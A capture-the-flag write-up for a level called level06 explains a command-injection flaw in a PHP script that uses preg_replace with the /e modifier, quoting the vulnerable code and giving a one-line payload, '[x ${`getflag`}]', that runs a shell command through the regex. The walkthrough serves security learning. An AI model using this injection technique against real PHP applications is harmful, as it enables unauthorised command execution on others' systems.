## level06

This level required to use injection in the regex inside php script.

[Curly syntax php](https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex) <br>

[What \\1 means](https://stackoverflow.com/questions/54954183/what-does-this-1-mean-in-php) <br>

About [/e](https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier) pattern modifier

Here is the part of the code we are interested about:
```php
...
function x($y, $z) {
    # Read the content of a file into variable
    $a = file_get_contents($y); 

    # Call y with the second mached group and save the result
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
...
```

The script will try to load some file, and apply the regex to it.
The regex will search for `[x 'anything']` and run 'anything'. 

So the solution here is:
```bash
echo -e '[x ${`getflag`}]' > /tmp/file

./level06 /tmp/file
```